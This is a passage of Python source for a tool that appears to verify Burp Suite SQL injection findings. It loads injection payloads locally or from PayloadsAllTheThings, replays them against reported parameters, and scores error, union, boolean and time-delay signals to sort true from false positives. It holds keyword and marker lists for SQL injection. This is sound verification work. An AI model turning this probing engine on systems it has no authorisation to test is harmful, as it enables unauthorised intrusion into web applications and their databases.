    def __init__(self, console: Optional[Console] = None) -> None:
        self.console = console or Console()

    def parse(self, xml_file: str) -> List[Finding]:
        xml_path = Path(xml_file)
        if not xml_path.exists():
            raise FileNotFoundError(f"Burp XML file not found: {xml_file}")

        raw = clean_xml_bytes(xml_path.read_bytes())
        try:
            root = ET.fromstring(raw)
        except ET.ParseError as exc:
            raise ValueError(f"Unable to parse Burp XML. Parse error: {exc}") from exc

        findings: List[Finding] = []
        for issue in root.findall("issue"):
            name = text_or_empty(issue.find("name"))
            issue_type = text_or_empty(issue.find("type"))
            if not self._is_sql_injection_issue(name, issue_type):
                continue

            host = text_or_empty(issue.find("host"))
            path = text_or_empty(issue.find("path"))
            location = text_or_empty(issue.find("location"))
            severity = text_or_empty(issue.find("severity"))
            confidence = text_or_empty(issue.find("confidence"))
            issue_detail_html = text_or_empty(issue.find("issueDetail"))
            issue_detail = strip_html_tags(issue_detail_html)
            serial_number = text_or_empty(issue.find("serialNumber"))

            original_requests: List[str] = []
            original_responses: List[str] = []
            first_parsed_request: Optional[ParsedRequest] = None
            method = "GET"

            for rr in issue.findall("requestresponse"):
                req_node = rr.find("request")
                resp_node = rr.find("response")
                raw_req = decode_burp_blob(req_node)
                raw_resp = decode_burp_blob(resp_node)
                if raw_req:
                    original_requests.append(raw_req)
                    parsed = parse_raw_http_request(raw_req)
                    if parsed and first_parsed_request is None:
                        first_parsed_request = parsed
                        method = req_node.attrib.get("method") or parsed.method
                if raw_resp:
                    original_responses.append(raw_resp)

            if first_parsed_request and first_parsed_request.path:
                url = self._build_url_from_request(host, first_parsed_request.path)
            else:
                url = url_join_host_path(host, path)

            parameter = self._extract_parameter(location, issue_detail, first_parsed_request, url)

            findings.append(
                Finding(
                    serial_number=serial_number,
                    url=url,
                    method=method.upper(),
                    parameter=parameter,
                    severity=severity,
                    confidence=confidence,
                    issue_name=name,
                    issue_detail=issue_detail,
                    original_requests=original_requests,
                    original_responses=original_responses,
                    parsed_request=first_parsed_request,
                )
            )

        return findings

    @staticmethod
    def _is_sql_injection_issue(name: str, issue_type: str) -> bool:
        # Burp issue type 1049088 is commonly SQL injection, but name is clearer.
        haystack = f"{name} {issue_type}".lower()
        return "sql injection" in haystack or issue_type.strip() == "1049088"

    @staticmethod
    def _build_url_from_request(host: str, request_path: str) -> str:
        if re.match(r"^https?://", request_path, re.I):
            return request_path
        return url_join_host_path(host, request_path)

    @staticmethod
    def _extract_parameter(
        location: str,
        issue_detail: str,
        parsed_request: Optional[ParsedRequest],
        url: str,
    ) -> str:
        # Burp often says: /path [id parameter]
        m = re.search(r"\[([^\]]+)\s+parameter\]", location, re.I)
        if m:
            return m.group(1).strip()

        # Burp issue detail often says: The id parameter appears...
        m = re.search(r"\bThe\s+([A-Za-z0-9_.\-\[\]]+)\s+parameter\b", issue_detail, re.I)
        if m:
            return m.group(1).strip()

        # Try query string.
        parsed_url = urllib.parse.urlsplit(url)
        query = urllib.parse.parse_qs(parsed_url.query, keep_blank_values=True)
        if query:
            return next(iter(query.keys()))

        # Try POST body.
        if parsed_request and parsed_request.body:
            content_type = header_get(parsed_request.headers, "Content-Type")
            if "application/x-www-form-urlencoded" in content_type.lower() or "=" in parsed_request.body:
                params = urllib.parse.parse_qs(parsed_request.body, keep_blank_values=True)
                if params:
                    return next(iter(params.keys()))

        return ""


def apply_target_base_url_override(
    findings: List[Finding],
    target_base_url: str,
    preserve_host_header: bool = False,
    console: Optional[Console] = None,
) -> None:
    """Replace scheme/host/port in each finding URL while preserving path/query.

    This is useful when a Burp report contains http://127.0.0.1 but the scanner
    runs somewhere else, or the lab is exposed on a different host/port.
    """
    if not target_base_url:
        return

    c = console or Console()
    new_base = urllib.parse.urlsplit(target_base_url)
    if not new_base.scheme or not new_base.netloc:
        raise ValueError("--target-base-url must include scheme and host, e.g. http://127.0.0.1:8080")

    for finding in findings:
        old = urllib.parse.urlsplit(finding.url)
        new_url = urllib.parse.urlunsplit((new_base.scheme, new_base.netloc, old.path, old.query, old.fragment))
        c.info(f"Target override: {finding.url} -> {new_url}")
        finding.url = new_url

        # The original Burp request normally has Host: 127.0.0.1. If we override
        # the actual target host, update Host too unless explicitly told not to.
        if finding.parsed_request and not preserve_host_header:
            replaced = False
            new_headers: Dict[str, str] = {}
            for name, value in finding.parsed_request.headers.items():
                if name.lower() == "host":
                    new_headers[name] = new_base.netloc
                    replaced = True
                else:
                    new_headers[name] = value
            if not replaced:
                new_headers["Host"] = new_base.netloc
            finding.parsed_request.headers = new_headers


# =============================================================================
# PAYLOAD LOADER
# =============================================================================

class PayloadLoader:
    def __init__(
        self,
        payload_dir: str = LOCAL_PAYLOAD_DIR,
        payload_file: str = None,
        max_per_category: int = MAX_PAYLOADS_PER_CATEGORY,
        allow_github: bool = False,
        refresh_payloads: bool = False,
        timeout: int = PAYLOAD_DOWNLOAD_TIMEOUT,
        console: Optional[Console] = None,
    ) -> None:
        self.payload_dir = Path(payload_dir)
        self.payload_file = Path(payload_file) if payload_file else None
        self.max_per_category = max_per_category
        self.allow_github = allow_github
        self.refresh_payloads = refresh_payloads
        self.timeout = timeout
        self.console = console or Console()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})
        self._cache: Dict[str, Dict[str, List[str]]] = {}

    def init_payload_files(self, overwrite: bool = False) -> None:
        """Create a local payload tree."""
        self.payload_dir.mkdir(parents=True, exist_ok=True)
        all_sets: Dict[str, Dict[str, List[str]]] = {"generic": FALLBACK_PAYLOADS}
        all_sets.update(DBMS_SPECIFIC_FALLBACK_PAYLOADS)

        for dbms, category_map in all_sets.items():
            base_dir = self.payload_dir / dbms
            base_dir.mkdir(parents=True, exist_ok=True)
            for category, filename in CATEGORY_FILES.items():
                path = base_dir / filename
                if path.exists() and not overwrite:
                    self.console.info(f"Payload file exists, not overwriting: {path}")
                    continue
                payloads = category_map.get(category, FALLBACK_PAYLOADS.get(category, []))
                content_lines = [
                    f"## {dbms}/{category} payloads",
                    "## One payload per line. Lines beginning with ## or // are comments.",
                    "## Keep these non-destructive for verification workflows.",
                    "",
                ]
                content_lines.extend(payloads)
                path.write_text("\n".join(content_lines) + "\n", encoding="utf-8")
                self.console.ok(f"Wrote {path}")

    def load_payloads(self) -> Dict[str, List[str]]:
        """Backward-compatible generic payload loader."""
        return self.load_payloads_for_dbms("generic")

    def load_payloads_from_file(self, file_path: Path) -> Dict[str, List[str]]:
        """Load payloads from a single file with category headers"""
        if not file_path.exists():
            return {}
        
        loaded: Dict[str, List[str]] = {}
        current_category = None
        
        try:
            raw_lines = file_path.read_text(encoding="utf-8", errors="ignore").splitlines()
            for raw in raw_lines:
                line = raw.strip()
                if not line:
                    continue
                
                if line.startswith('##'):
                    cat_name = line[2:].strip().lower().replace(' ', '_')
                    cat_map = {
                        'union': 'union_based',
                        'error': 'error_based',
                        'boolean': 'boolean_blind',
                        'time': 'time_blind',
                        'stacked': 'stacked_queries',
                    }
                    current_category = None
                    for key, val in cat_map.items():
                        if key in cat_name:
                            current_category = val
                            break
                    if not current_category:
                        current_category = cat_name
                    if current_category not in loaded:
                        loaded[current_category] = []
                    continue
                
                if line.startswith(('#', '//', '/*', '*', '=', '-', '_')):
                    continue
                
                if not line:
                    continue
                
                if current_category and line:
                    loaded[current_category].append(line)
                else:
                    if 'union' in line.lower() or 'select' in line.lower():
                        loaded.setdefault('union_based', []).append(line)
                    elif "'" in line or '"' in line:
                        loaded.setdefault('error_based', []).append(line)
                    elif 'sleep' in line.lower() or 'waitfor' in line.lower():
                        loaded.setdefault('time_blind', []).append(line)
                    elif '1=1' in line.lower() or '1=2' in line.lower():
                        loaded.setdefault('boolean_blind', []).append(line)
                    elif ';' in line:
                        loaded.setdefault('stacked_queries', []).append(line)
                    else:
                        loaded.setdefault('generic', []).append(line)
        except Exception as e:
            self.console.warn(f"Failed to load payload file {file_path}: {e}")
        
        return loaded

    def load_payloads_for_dbms(self, dbms: str = "generic") -> Dict[str, List[str]]:
        """Load payloads for a detected DBMS."""
        dbms = normalize_dbms(dbms)
        cache_key = dbms
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        if self.payload_file and self.payload_file.exists():
            self.console.info(f"Loading payloads from file: {self.payload_file}")
            loaded = self.load_payloads_from_file(self.payload_file)
            self._cache[cache_key] = loaded
            return loaded
        
        loaded: Dict[str, List[str]] = {}
        self.payload_dir.mkdir(parents=True, exist_ok=True)

        for category, filename in CATEGORY_FILES.items():
            payloads: List[str] = []

            specific_path = self.payload_dir / dbms / filename if dbms != "generic" else None
            generic_path = self.payload_dir / "generic" / filename
            legacy_path = self.payload_dir / filename

            if self.refresh_payloads:
                if dbms != "generic":
                    remote_specific = self._load_category_from_github_dbms(category, dbms)
                    if remote_specific and specific_path is not None:
                        self._write_local_payloads(specific_path, f"{dbms}/{category}", remote_specific)
                        self.console.ok(f"Refreshed {dbms}/{category} from GitHub into {specific_path}")
                remote_generic = self._load_category_from_github(category)
                if remote_generic:
                    self._write_local_payloads(generic_path, f"generic/{category}", remote_generic)
                    self.console.ok(f"Refreshed generic/{category} from GitHub into {generic_path}")

            if specific_path is not None:
                specific_payloads = self._load_category_local(specific_path)
                if specific_payloads:
                    self.console.ok(f"Loaded {len(specific_payloads)} payload(s) for {dbms}/{category} from {specific_path}")
                    payloads.extend(specific_payloads)

            generic_payloads = self._load_category_local(generic_path)
            if generic_payloads:
                self.console.ok(f"Loaded {len(generic_payloads)} generic payload(s) for {category} from {generic_path}")
                payloads.extend(generic_payloads)

            legacy_payloads = self._load_category_local(legacy_path)
            if legacy_payloads:
                self.console.ok(f"Loaded {len(legacy_payloads)} legacy payload(s) for {category} from {legacy_path}")
                payloads.extend(legacy_payloads)

            if not payloads and self.allow_github:
                if dbms != "generic":
                    payloads.extend(self._load_category_from_github_dbms(category, dbms))
                payloads.extend(self._load_category_from_github(category))
                if payloads:
                    self.console.ok(f"Loaded payload(s) for {dbms}/{category} from GitHub")

            if not payloads and dbms != "generic":
                payloads = DBMS_SPECIFIC_FALLBACK_PAYLOADS.get(dbms, {}).get(category, [])
                if payloads:
                    self.console.warn(f"Using built-in {dbms} fallback payloads for {category}")

            if not payloads:
                payloads = FALLBACK_PAYLOADS.get(category, [])
                self.console.warn(f"Using built-in generic fallback payloads for {category}")

            loaded[category] = self._dedupe(payloads)[: self.max_per_category]

        total = sum(len(v) for v in loaded.values())
        self.console.ok(f"Prepared {total} payload(s) for DBMS profile '{dbms}' across {len(loaded)} categories")
        self._cache[cache_key] = loaded
        return loaded

    def _load_category_local(self, path: Path) -> List[str]:
        if not path.exists():
            return []
        try:
            raw_lines = path.read_text(encoding="utf-8", errors="ignore").splitlines()
            return self._parse_payload_lines(raw_lines)
        except Exception as exc:
            self.console.warn(f"Failed reading local payload file {path}: {exc}")
            return []

    def _load_category_from_github(self, category: str) -> List[str]:
        remote_file = REMOTE_CATEGORY_FILES.get(category)
        if not remote_file:
            return []
        url = GITHUB_SQLI_BASE_URL + urllib.parse.quote(remote_file, safe="/")
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=GITHUB_VERIFY_SSL)
            if resp.status_code != 200 or not resp.text.strip():
                self.console.warn(f"GitHub payload file unavailable for {category}: HTTP {resp.status_code} {url}")
                return []
            payloads = self._parse_payload_lines(resp.text.splitlines())
            payloads = self._filter_remote_payloads(category, payloads)
            return payloads[: self.max_per_category]
        except requests.RequestException as exc:
            self.console.warn(f"GitHub download failed for {category}: {exc}")
            return []

    def _load_category_from_github_dbms(self, category: str, dbms: str) -> List[str]:
        dbms = normalize_dbms(dbms)
        remote_file = REMOTE_DBMS_DOC_FILES.get(dbms)
        if not remote_file:
            return []
        url = GITHUB_SQLI_BASE_URL + urllib.parse.quote(remote_file, safe="/")
        try:
            resp = self.session.get(url, timeout=self.timeout, verify=GITHUB_VERIFY_SSL)
            if resp.status_code != 200 or not resp.text.strip():
                self.console.warn(f"GitHub DBMS doc unavailable for {dbms}/{category}: HTTP {resp.status_code} {url}")
                return []
            payloads = self._extract_payloads_from_markdown(resp.text, dbms=dbms, category=category)
            payloads = self._filter_remote_payloads(category, payloads)
            return payloads[: self.max_per_category]
        except requests.RequestException as exc:
            self.console.warn(f"GitHub DBMS payload download failed for {dbms}/{category}: {exc}")
            return []

    @staticmethod
    def _extract_payloads_from_markdown(markdown_text: str, dbms: str, category: str) -> List[str]:
        candidates: List[str] = []
        in_fence = False
        for raw in markdown_text.splitlines():
            line = raw.strip()
            if line.startswith("```"):
                in_fence = not in_fence
                continue
            if not line:
                continue
            if line.startswith(("- `", "* `")) and line.endswith("`"):
                line = line[3:-1].strip()
            elif line.startswith("`") and line.endswith("`"):
                line = line[1:-1].strip()
            elif not in_fence:
                continue
            if not line or len(line) > 240:
                continue
            lowered = line.lower()
            sql_markers = ["select", "union", "sleep", "pg_sleep", "waitfor", "extractvalue", "updatexml", "version", "sqlite_version", "dbms_pipe", "cast", "convert", "--", "/*", "'", '"']
            if any(marker in lowered for marker in sql_markers):
                candidates.append(line)
        return candidates

    def _write_local_payloads(self, path: Path, category: str, payloads: List[str]) -> None:
        path.parent.mkdir(parents=True, exist_ok=True)
        content = [
            f"## {category} payloads",
            "## Auto-refreshed from PayloadsAllTheThings.",
            "## Review before using in production workflows.",
            "",
        ]
        content.extend(payloads[: self.max_per_category])
        path.write_text("\n".join(content) + "\n", encoding="utf-8")

    @staticmethod
    def _parse_payload_lines(lines: Iterable[str]) -> List[str]:
        payloads: List[str] = []
        for raw in lines:
            line = raw.strip()
            if not line:
                continue
            if line.startswith("##") or line.startswith("//"):
                continue
            if line.startswith(("# ", "###", "- ", "* ", "```", "|")):
                continue
            payloads.append(line)
        return payloads

    @staticmethod
    def _dedupe(payloads: List[str]) -> List[str]:
        seen = set()
        out = []
        for payload in payloads:
            if payload not in seen:
                seen.add(payload)
                out.append(payload)
        return out

    @staticmethod
    def _filter_remote_payloads(category: str, payloads: List[str]) -> List[str]:
        filtered: List[str] = []
        for p in payloads:
            pl = p.lower()
            if category == "union_based" and "union" in pl:
                filtered.append(p)
            elif category == "error_based" and any(x in pl for x in ["extractvalue", "convert", "updatexml", "sqlstate", "@@version", "'"]):
                filtered.append(p)
            elif category == "boolean_blind" and any(x in pl for x in ["1=1", "1=2", "true", "false", "'='", "or 1=1", "and 1=1"]):
                filtered.append(p)
            elif category == "time_blind" and any(x in pl for x in ["sleep", "pg_sleep", "waitfor", "delay", "benchmark", "dbms_pipe"]):
                filtered.append(p)
            elif category == "stacked_queries" and ";" in p and any(x in pl for x in ["select", "sleep", "waitfor", "pg_sleep"]):
                filtered.append(p)
        return filtered or payloads
class SQLiTester:
    def __init__(
        self,
        payloads: Optional[Dict[str, List[str]]] = None,
        payload_loader: Optional[PayloadLoader] = None,
        timeout: int = HTTP_TIMEOUT,
        verify_ssl: bool = TARGET_VERIFY_SSL,
        early_exit: bool = True,
        proxy: Optional[str] = None,
        manual_cookie: Optional[str] = None,
        extra_headers: Optional[Iterable[str]] = None,
        include_secrets_in_report: bool = False,
        manual_dbms: Optional[str] = None,
        fingerprint_mode: str = "auto",
        manual_dbms_version: str = "",
        baseline_samples: int = BASELINE_SAMPLE_COUNT,
        true_positive_threshold: int = TRUE_POSITIVE_SCORE_THRESHOLD,
        false_positive_threshold: int = FALSE_POSITIVE_SCORE_THRESHOLD,
        reliability_threshold: int = RELIABILITY_SCORE_THRESHOLD,
        console: Optional[Console] = None,
    ) -> None:
        self.payloads = payloads or {}
        self.payload_loader = payload_loader
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.early_exit = early_exit
        self.proxy = proxy
        self.manual_cookie = manual_cookie or ""
        self.extra_headers = parse_extra_headers(extra_headers or [])
        self.include_secrets_in_report = include_secrets_in_report
        self.manual_dbms = (manual_dbms or "").lower().strip()
        self.fingerprint_mode = (fingerprint_mode or "auto").lower().strip()
        self.manual_dbms_version = manual_dbms_version or ""
        self.baseline_samples = max(1, int(baseline_samples or 1))
        self.true_positive_threshold = int(true_positive_threshold)
        self.false_positive_threshold = int(false_positive_threshold)
        self.reliability_threshold = int(reliability_threshold)
        self.console = console or Console()
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": USER_AGENT})

        # If someone passes --header "Cookie: ...", treat it exactly like --cookie.
        cookie_from_header = pop_header_case_insensitive(self.extra_headers, "Cookie")
        if cookie_from_header and not self.manual_cookie:
            self.manual_cookie = cookie_from_header

        if self.proxy:
            self.session.proxies.update({"http": self.proxy, "https": self.proxy})
            # Keep explicit CLI proxy deterministic instead of inheriting env vars.
            self.session.trust_env = False

        if not verify_ssl:
            warnings.simplefilter("ignore", InsecureRequestWarning)

    def test_finding(self, finding: Finding) -> TestResult:
        self.console.info(f"Target: {finding.method} {finding.url} parameter='{finding.parameter}'")

        errors: List[str] = []
        payload_results: List[PayloadResult] = []
        fingerprint = FingerprintResult()
        scoring = ScoringSummary()

        if not finding.parameter:
            verdict = "No parameter name could be extracted from Burp issue metadata. Test is inconclusive."
            self._add_penalty(scoring, "missing_parameter", 50, verdict)
            scoring.reliability_score = max(0, scoring.reliability_score - 50)
            return TestResult(finding, "INCONCLUSIVE", verdict, None, 0, 0.0, payload_results, [verdict], fingerprint, scoring)

        self._seed_session_cookies(finding)
        self._score_passive_burp_evidence(scoring, finding)

        baseline_samples: List[Tuple[Optional[int], int, float, str]] = []
        baseline_body = ""
        baseline_status: Optional[int] = None
        baseline_size = 0
        baseline_time = 0.0

        for idx in range(self.baseline_samples):
            status, size, elapsed, body, baseline_error = self._send_baseline(finding)
            if baseline_error:
                errors.append(baseline_error)
                self.console.warn(baseline_error)
                if idx == 0:
                    scoring.reliability_score = 0
                    self._add_penalty(scoring, "baseline_unreachable", 100, baseline_error)
                    verdict = (
                        "Target could not be reached during baseline request; finding was not tested "
                        "and should not be counted as a false positive. Check host/port, proxy, "
                        "manual cookie, and --target-base-url."
                    )
                    return TestResult(
                        finding=finding,
                        classification="UNREACHABLE",
                        verdict=verdict,
                        baseline_status=status,
                        baseline_size=size,
                        baseline_time=elapsed,
                        payload_results=payload_results,
                        errors=errors,
                        fingerprint=fingerprint,
                        scoring=scoring,
                    )
                self._add_penalty(scoring, "baseline_sample_failed", 20, baseline_error)
                continue

            baseline_samples.append((status, size, elapsed, body))
            if idx == 0:
                baseline_status, baseline_size, baseline_time, baseline_body = status, size, elapsed, body
                self.console.info(f"Baseline {status} size={size} time={elapsed:.2f}s")
            else:
                self.console.info(f"Baseline sample {idx + 1}/{self.baseline_samples} {status} size={size} time={elapsed:.2f}s")

        if not baseline_samples:
            scoring.reliability_score = 0
            verdict = "No baseline request succeeded; finding was not tested."
            return TestResult(finding, "UNREACHABLE", verdict, None, 0, 0.0, payload_results, errors, fingerprint, scoring)

        self._score_baseline_stability(scoring, baseline_samples)

        if looks_like_login_page(baseline_status, baseline_body, finding.url):
            msg = "Baseline appears to be an unauthenticated/login page. Cookie or token may be expired."
            errors.append(msg)
            self._add_penalty(scoring, "auth_failed", 100, msg)
            scoring.reliability_score = 0
            self.console.warn(msg)
            return TestResult(
                finding=finding,
                classification="AUTH_FAILED",
                verdict=msg,
                baseline_status=baseline_status,
                baseline_size=baseline_size,
                baseline_time=baseline_time,
                payload_results=payload_results,
                errors=errors,
                fingerprint=fingerprint,
                scoring=scoring,
            )

        if looks_like_waf_or_block_page(baseline_status, baseline_body):
            msg = "Baseline appears to be a WAF/block page; active verification is not reliable."
            self._add_penalty(scoring, "waf_block_page", 60, msg)
            errors.append(msg)
            self.console.warn(msg)

        fingerprint, fingerprint_results = self._fingerprint_dbms(
            finding=finding,
            baseline_status=baseline_status,
            baseline_size=baseline_size,
            baseline_time=baseline_time,
            baseline_body=baseline_body,
        )
        payload_results.extend(fingerprint_results)
        self.console.ok(
            f"DBMS fingerprint: {fingerprint.dbms} "
            f"confidence={fingerprint.confidence} source={fingerprint.source}"
            + (f" version={fingerprint.version}" if fingerprint.version else "")
        )
        if fingerprint.dbms != "generic" and fingerprint.confidence in {"high", "manual", "medium"}:
            self._add_signal_unique(
                scoring,
                EvidenceSignal(
                    signal_type="dbms_fingerprint",
                    score=20 if fingerprint.confidence != "manual" else 10,
                    reason=f"DBMS selected as {fingerprint.dbms} from {fingerprint.source}",
                ),
            )

        if self.payload_loader is not None:
            active_payloads = self.payload_loader.load_payloads_for_dbms(fingerprint.dbms)
        else:
            active_payloads = self.payloads

        boolean_true_results: List[PayloadResult] = []
        boolean_false_results: List[PayloadResult] = []
        seen_boolean_pairs: set[str] = set()

        for category, category_payloads in active_payloads.items():
            for payload in category_payloads:
                result = self._send_payload(finding, category, payload)
                payload_results.append(result)
                self._print_payload_result(result)

                self._score_payload_result(
                    scoring=scoring,
                    category=category,
                    payload=payload,
                    result=result,
                    baseline_status=baseline_status,
                    baseline_size=baseline_size,
                    baseline_time=baseline_time,
                )

                if category == "boolean_blind" and not result.error:
                    kind = self._boolean_payload_kind(payload)
                    if kind == "true":
                        boolean_true_results.append(result)
                    elif kind == "false":
                        boolean_false_results.append(result)
                    self._score_boolean_pairs(scoring, boolean_true_results, boolean_false_results, seen_boolean_pairs)

                self._score_reliability_from_payloads(scoring, payload_results, active_payloads)
                if self.early_exit:
                    current_classification = self._classification_from_scores(scoring)
                    critical_signal = any(sig.score >= 90 for sig in scoring.signals)
                    if current_classification == "TRUE_POSITIVE" and critical_signal:
                        scoring.confidence = self._confidence_from_scores(current_classification, scoring)
                        verdict = self._build_verdict(current_classification, scoring)
                        self.console.tp(verdict)
                        return TestResult(
                            finding=finding,
                            classification=current_classification,
                            verdict=verdict,
                            baseline_status=baseline_status,
                            baseline_size=baseline_size,
                            baseline_time=baseline_time,
                            payload_results=payload_results,
                            errors=errors,
                            fingerprint=fingerprint,
                            scoring=scoring,
                        )

        self._score_reliability_from_payloads(scoring, payload_results, active_payloads)
        classification = self._classification_from_scores(scoring)
        scoring.confidence = self._confidence_from_scores(classification, scoring)
        verdict = self._build_verdict(classification, scoring)

        if classification == "TRUE_POSITIVE":
            self.console.tp(verdict)
        elif classification == "FALSE_POSITIVE":
            self.console.fp(verdict)
        else:
            self.console.warn(f"[{classification}] {verdict}")

        return TestResult(
            finding=finding,
            classification=classification,
            verdict=verdict,
            baseline_status=baseline_status,
            baseline_size=baseline_size,
            baseline_time=baseline_time,
            payload_results=payload_results,
            errors=errors,
            fingerprint=fingerprint,
            scoring=scoring,
        )


    def _add_signal_unique(self, scoring: ScoringSummary, signal: EvidenceSignal) -> None:
        key = (signal.signal_type, signal.reason, signal.category, signal.payload)
        existing = {(s.signal_type, s.reason, s.category, s.payload) for s in scoring.signals}
        if key in existing:
            return
        scoring.signals.append(signal)
        scoring.evidence_score += max(0, signal.score)

    def _add_penalty(self, scoring: ScoringSummary, penalty_type: str, points: int, reason: str) -> None:
        key = (penalty_type, reason)
        existing = {(p.penalty_type, p.reason) for p in scoring.penalties}
        if key in existing:
            return
        points = max(0, int(points))
        scoring.penalties.append(ReliabilityPenalty(penalty_type=penalty_type, points=points, reason=reason))
        scoring.reliability_score = max(0, scoring.reliability_score - points)

    def _score_passive_burp_evidence(self, scoring: ScoringSummary, finding: Finding) -> None:
        detail = html.unescape(finding.issue_detail or "")
        lowered = detail.lower()
        confidence = (finding.confidence or "").lower()

        if confidence in {"firm", "certain"}:
            self._add_signal_unique(
                scoring,
                EvidenceSignal(
                    signal_type="burp_confidence",
                    score=10,
                    reason=f"Burp confidence is {finding.confidence}",
                ),
            )

        if re.search(r"database\s+appears\s+to\s+be|mysql|postgresql|sql\s+server|oracle|sqlite", lowered, re.I):
            self._add_signal_unique(
                scoring,
                EvidenceSignal(
                    signal_type="burp_dbms_hint",
                    score=10,
                    reason="Burp issue detail contains DBMS/error context",
                ),
            )

        if re.search(r"took\s+<b>\d+</b>\s+milliseconds|time\s+delay|sleep\s*\(", lowered, re.I):
            self._add_signal_unique(
                scoring,
                EvidenceSignal(
                    signal_type="burp_time_delay_evidence",
                    score=35,
                    reason="Burp issue detail reports time-delay SQLi evidence",
                ),
            )

        if re.search(r"single quote.*error|error message.*disappeared|general error message", lowered, re.I | re.S):
            self._add_signal_unique(
                scoring,
                EvidenceSignal(
                    signal_type="burp_error_behavior_evidence",
                    score=25,
                    reason="Burp issue detail reports quote/error SQLi behavior",
                ),
            )

    def _score_baseline_stability(
        self,
        scoring: ScoringSummary,
        baseline_samples: List[Tuple[Optional[int], int, float, str]],
    ) -> None:
        if len(baseline_samples) < 2:
            return

        statuses = [s[0] for s in baseline_samples]
        sizes = [s[1] for s in baseline_samples]
        times = [s[2] for s in baseline_samples]

        if len(set(statuses)) > 1:
            self._add_penalty(
                scoring,
                "baseline_status_unstable",
                40,
                f"Baseline status codes varied across samples: {statuses}",
            )

        avg_size = sum(sizes) / max(len(sizes), 1)
        if avg_size > 0:
            size_var = (max(sizes) - min(sizes)) / avg_size
            if size_var > 0.10:
                self._add_penalty(
                    scoring,
                    "baseline_size_unstable",
                    30,
                    f"Baseline response size varied by {size_var:.1%} across samples",
                )
            elif size_var > 0.05:
                self._add_penalty(
                    scoring,
                    "baseline_size_somewhat_unstable",
                    15,
                    f"Baseline response size varied by {size_var:.1%} across samples",
                )

        if times and (max(times) - min(times)) > 2.0:
            self._add_penalty(
                scoring,
                "baseline_latency_unstable",
                15,
                f"Baseline latency varied from {min(times):.2f}s to {max(times):.2f}s",
            )

    def _score_payload_result(
        self,
        scoring: ScoringSummary,
        category: str,
        payload: str,
        result: PayloadResult,
        baseline_status: Optional[int],
        baseline_size: int,
        baseline_time: float,
    ) -> None:
        if result.error:
            return
        if result.status_code is None:
            return

        body = result.response_body or result.response_snippet or ""

        if self._has_db_error(body):
            reason = "Database error pattern detected in payload response"
            result.evidence.append(reason)
            self._add_signal_unique(
                scoring,
                EvidenceSignal("db_error_pattern", 85, reason, category, payload, result.status_code, result.response_size, result.response_time),
            )

        if "SQLI_UNION_MARKER" in body:
            reason = "Union marker appeared in response body"
            result.evidence.append(reason)
            self._add_signal_unique(
                scoring,
                EvidenceSignal("union_marker", 100, reason, category, payload, result.status_code, result.response_size, result.response_time),
            )

        delay_signal = self._time_delay_signal(payload, result.response_time, baseline_time)
        if delay_signal and category in {"time_blind", "stacked_queries"}:
            score = 90 if category == "time_blind" else 85
            reason = (
                f"Time-delay behavior detected: payload response {result.response_time:.2f}s "
                f"vs baseline {baseline_time:.2f}s"
            )
            result.evidence.append(reason)
            self._add_signal_unique(
                scoring,
                EvidenceSignal("time_delay", score, reason, category, payload, result.status_code, result.response_size, result.response_time),
            )

        if baseline_status is not None and baseline_status < 500 <= result.status_code:
            if category == "error_based":
                score = 65
                reason = f"Error payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
            elif category == "union_based":
                score = 30
                reason = f"Union payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
            elif category == "stacked_queries":
                score = 25
                reason = f"Stacked-query payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
            else:
                score = 20
                reason = f"Payload caused HTTP {result.status_code} while baseline was HTTP {baseline_status}"
            result.evidence.append(reason)
            self._add_signal_unique(
                scoring,
                EvidenceSignal("payload_status_change", score, reason, category, payload, result.status_code, result.response_size, result.response_time),
            )

        if category == "union_based" and result.status_code == baseline_status:
            rel = relative_delta(result.response_size, baseline_size)
            if rel >= 0.15:
                reason = f"Union payload changed response size by {rel:.1%} from baseline"
                result.evidence.append(reason)
                self._add_signal_unique(
                    scoring,
                    EvidenceSignal("union_large_size_delta", 35, reason, category, payload, result.status_code, result.response_size, result.response_time),
                )
            elif rel >= 0.05:
                reason = f"Union payload changed response size by {rel:.1%} from baseline"
                result.evidence.append(reason)
                self._add_signal_unique(
                    scoring,
                    EvidenceSignal("union_medium_size_delta", 20, reason, category, payload, result.status_code, result.response_size, result.response_time),
                )

        if looks_like_waf_or_block_page(result.status_code, body):
            self._add_penalty(
                scoring,
                "payload_waf_block",
                50,
                f"Payload response looks like a WAF/block page for category {category}",
            )

    def _score_boolean_pairs(
        self,
        scoring: ScoringSummary,
        true_results: List[PayloadResult],
        false_results: List[PayloadResult],
        seen_pairs: set[str],
    ) -> None:
        for t in true_results:
            for f in false_results:
                pair_key = f"{t.payload}|{f.payload}"
                if pair_key in seen_pairs:
                    continue
                seen_pairs.add(pair_key)

                if t.error or f.error or t.status_code is None or f.status_code is None:
                    continue

                best: Optional[EvidenceSignal] = None
                if t.status_code != f.status_code:
                    reason = (
                        "Boolean-blind behavior detected: true-condition status "
                        f"{t.status_code} differs from false-condition status {f.status_code}"
                    )
                    best = EvidenceSignal("boolean_status_delta", 65, reason, "boolean_blind", t.payload + " || " + f.payload)

                rel = relative_delta(t.response_size, f.response_size)
                if rel >= 0.15:
                    reason = (
                        "Boolean-blind behavior detected: true/false response sizes differ strongly "
                        f"({t.response_size} vs {f.response_size}, delta {rel:.1%})"
                    )
                    candidate = EvidenceSignal("boolean_strong_size_delta", 75, reason, "boolean_blind", t.payload + " || " + f.payload)
                    if best is None or candidate.score > best.score:
                        best = candidate
                elif rel >= 0.05 or abs(t.response_size - f.response_size) >= 100:
                    reason = (
                        "Boolean-blind behavior detected: true/false response sizes differ "
                        f"({t.response_size} vs {f.response_size}, delta {rel:.1%})"
                    )
                    candidate = EvidenceSignal("boolean_medium_size_delta", 55, reason, "boolean_blind", t.payload + " || " + f.payload)
                    if best is None or candidate.score > best.score:
                        best = candidate

                sim = body_similarity_ratio(t.response_snippet, f.response_snippet)
                if sim < 0.75:
                    reason = f"Boolean-blind behavior detected: true/false snippets differ, similarity={sim:.2f}"
                    candidate = EvidenceSignal("boolean_similarity_delta", 55, reason, "boolean_blind", t.payload + " || " + f.payload)
                    if best is None or candidate.score > best.score:
                        best = candidate

                if best is not None:
                    t.evidence.append(best.reason)
